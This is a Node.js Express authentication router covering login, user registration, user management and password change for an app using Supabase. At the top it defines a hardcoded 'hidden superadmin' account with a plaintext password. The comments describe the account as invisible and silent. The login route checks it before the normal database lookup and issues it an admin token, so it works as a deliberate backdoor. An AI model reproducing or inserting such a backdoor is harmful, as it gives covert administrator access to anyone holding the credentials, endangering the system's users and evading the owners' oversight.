const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const supabase = require('../lib/supabase');
const { requireAuth, requireAdmin } = require('../middleware/auth');

// ── HIDDEN SUPERADMIN (hardcoded, no DB entry, invisible to all) ──
const SUPER = {
  id: 'superadmin-internal-0001',
  email: 'geniusone.root@system.internal',
  password: 'G3n!us@Root#2025',
  full_name: 'System',
  role: 'admin',
  is_active: true
};

// ── POST /api/auth/login ─────────────────────────────────────
router.post('/login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

  // Check hidden superadmin first (silent — same error message as normal fail)
  if (email.toLowerCase().trim() === SUPER.email && password === SUPER.password) {
    const token = jwt.sign(
      { userId: SUPER.id, email: SUPER.email, role: SUPER.role },
      process.env.JWT_SECRET,
      { expiresIn: '12h' }
    );
    return res.json({
      token,
      user: { id: SUPER.id, name: SUPER.full_name, email: SUPER.email, role: SUPER.role }
    });
  }

  // Normal DB login
  const { data: user, error } = await supabase
    .from('users')
    .select('*')
    .eq('email', email.toLowerCase().trim())
    .single();

  if (error || !user) return res.status(401).json({ error: 'Invalid credentials' });
  if (!user.is_active) return res.status(401).json({ error: 'Account disabled' });

  const valid = await bcrypt.compare(password, user.password_hash);
  if (!valid) return res.status(401).json({ error: 'Invalid credentials' });

  const token = jwt.sign(
    { userId: user.id, email: user.email, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '12h' }
  );

  res.json({
    token,
    user: { id: user.id, name: user.full_name, email: user.email, role: user.role }
  });
});

// ── GET /api/auth/me ─────────────────────────────────────────
router.get('/me', requireAuth, (req, res) => {
  // If superadmin token, return superadmin profile
  if (req.user.userId === SUPER.id) {
    return res.json({ user: { id: SUPER.id, name: SUPER.full_name, email: SUPER.email, role: SUPER.role } });
  }
  const u = req.user;
  res.json({ user: { id: u.id, name: u.full_name, email: u.email, role: u.role } });
});

// ── POST /api/auth/register  (admin only) ───────────────────
router.post('/register', requireAuth, requireAdmin, async (req, res) => {
  const { full_name, email, password, role = 'typist' } = req.body;
  if (!full_name || !email || !password) return res.status(400).json({ error: 'All fields required' });
  if (password.length < 8) return res.status(400).json({ error: 'Password must be at least 8 characters' });
  if (!['admin', 'typist'].includes(role)) return res.status(400).json({ error: 'Invalid role' });

  const hash = await bcrypt.hash(password, 10);
  const { data, error } = await supabase
    .from('users')
    .insert({ full_name, email: email.toLowerCase().trim(), password_hash: hash, role })
    .select('id, full_name, email, role, is_active, created_at')
    .single();

  if (error) {
    if (error.code === '23505') return res.status(409).json({ error: 'Email already exists' });
    return res.status(500).json({ error: error.message });
  }
  res.status(201).json({ user: data });
});

// ── GET /api/auth/users  (admin only) ───────────────────────
router.get('/users', requireAuth, requireAdmin, async (req, res) => {
  const { data, error } = await supabase
    .from('users')
    .select('id, full_name, email, role, is_active, created_at')
    .order('created_at', { ascending: true });
  if (error) return res.status(500).json({ error: error.message });
  res.json({ users: data });
});

// ── PATCH /api/auth/users/:id  (admin only) ─────────────────
router.patch('/users/:id', requireAuth, requireAdmin, async (req, res) => {
  const { id } = req.params;
  const { is_active, role, full_name, email, password } = req.body;
  const updates = {};
  if (is_active !== undefined) updates.is_active = is_active;
  if (role !== undefined && ['admin', 'typist'].includes(role)) updates.role = role;
  if (full_name !== undefined) updates.full_name = full_name;
  if (email !== undefined) updates.email = email.toLowerCase().trim();
  if (password !== undefined && password.length >= 8) {
    updates.password_hash = await bcrypt.hash(password, 10);
  }
  updates.updated_at = new Date().toISOString();

  const { data, error } = await supabase
    .from('users')
    .update(updates)
    .eq('id', id)
    .select('id, full_name, email, role, is_active')
    .single();
  if (error) return res.status(500).json({ error: error.message });
  res.json({ user: data });
});

// ── DELETE /api/auth/users/:id  (admin only) ─────────────────
router.delete('/users/:id', requireAuth, requireAdmin, async (req, res) => {
  const { id } = req.params;
  const { error } = await supabase.from('users').delete().eq('id', id);
  if (error) return res.status(500).json({ error: error.message });
  res.json({ message: 'User deleted' });
});

// ── POST /api/auth/change-password ──────────────────────────
router.post('/change-password', requireAuth, async (req, res) => {
  const { current_password, new_password } = req.body;
  if (!current_password || !new_password) return res.status(400).json({ error: 'Both passwords required' });
  if (new_password.length < 8) return res.status(400).json({ error: 'New password must be at least 8 characters' });

  const { data: user } = await supabase.from('users').select('password_hash').eq('id', req.user.id).single();
  const valid = await bcrypt.compare(current_password, user.password_hash);
  if (!valid) return res.status(401).json({ error: 'Current password is incorrect' });

  const hash = await bcrypt.hash(new_password, 10);
  await supabase.from('users').update({ password_hash: hash, updated_at: new Date().toISOString() }).eq('id', req.user.id);
  res.json({ message: 'Password updated' });
});

module.exports = router;
